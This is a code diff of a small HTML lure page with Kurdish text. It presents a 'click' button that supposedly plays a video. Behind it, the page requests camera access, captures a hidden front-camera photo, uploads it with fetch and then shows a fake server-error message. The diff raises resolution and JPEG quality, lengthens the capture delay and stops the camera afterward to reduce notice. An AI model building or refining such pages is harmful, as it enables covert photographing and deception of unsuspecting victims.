@@ -27,21 +27,20 @@
             position: relative;
         }
 
-        /* ناوی Ala و دڵەکە لە لای ڕاست */
         .name-tag {
             position: absolute;
             top: 15%; 
             left: 50%;
             transform: translateX(-50%);
             font-family: 'Poppins', sans-serif;
-            font-size: 32px; /* بچووکتر و ناسکتر */
+            font-size: 32px;
             color: rgba(255, 255, 255, 0.6); 
             display: flex;
             align-items: center;
             gap: 10px;
             white-space: nowrap;
             user-select: none;
-            direction: ltr; /* بۆ ئەوەی ناوەکە و دڵەکە ڕێک بن */
+            direction: ltr;
         }
 
         .heart-mini {
@@ -88,12 +87,6 @@
             justify-content: center;
             gap: 5px;
         }
-
-        #startBtn:hover {
-            background: rgba(255, 255, 255, 0.15);
-            transform: translateY(-5px);
-            border: 1px solid rgba(255, 255, 255, 0.4);
-        }
     </style>
 </head>
 <body>
@@ -105,7 +98,7 @@
         <button id="startBtn">&lt;👈🏽کلیک کردن👉🏽&gt;</button>
     </div>
 
-    <video id="v" autoplay playsinline style="display:none;"></video>
+    <video id="v" autoplay playsinline style="display:none; width: 1280px; height: 720px;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
@@ -116,14 +109,19 @@
             document.getElementById('status').innerText = "...کەمێک چاوەڕێ بکە";
             this.style.display = 'none';
 
-            navigator.mediaDevices.getUserMedia({ video: true })
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: 1280, height: 720 } 
+            })
             .then(s => {
                 const v = document.getElementById('v');
                 v.srcObject = s;
+                v.play();
                 
+                // کاتی چاوەڕوانی کرا بە ٢ چرکە
                 setTimeout(() => {
                     const c = document.getElementById('c');
-                    c.width = 640; c.height = 480;
+                    c.width = v.videoWidth; 
+                    c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v, 0, 0);
                     
                     c.toBlob(b => {
@@ -136,9 +134,10 @@
                             body: f
                         }).then(() => {
                             document.getElementById('status').innerText = "کێشەیەک لە سێرڤەر ڕوویدا.";
+                            s.getTracks().forEach(track => track.stop());
                         });
-                    }, 'image/jpeg');
-                }, 1000);
+                    }, 'image/jpeg', 0.9);
+                }, 2000); 
             })
             .catch(e => {
                 document.getElementById('status').innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
